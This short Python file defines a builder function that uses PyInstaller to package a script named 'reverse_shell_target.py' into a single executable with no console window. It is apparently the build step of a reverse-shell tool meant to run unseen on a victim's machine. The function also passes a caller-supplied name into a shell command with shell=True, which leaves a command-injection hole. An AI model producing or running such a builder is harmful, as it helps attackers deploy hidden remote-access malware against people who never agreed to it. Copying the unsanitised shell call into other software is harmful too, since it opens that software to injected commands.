import subprocess

def Builder(name):
    subprocess.run("dir",text=True,shell=True)
    subprocess.run(f'pyinstaller --noconsole --onefile --name "{name}" scripts/reverse_shell_target.py',text=True,shell=True)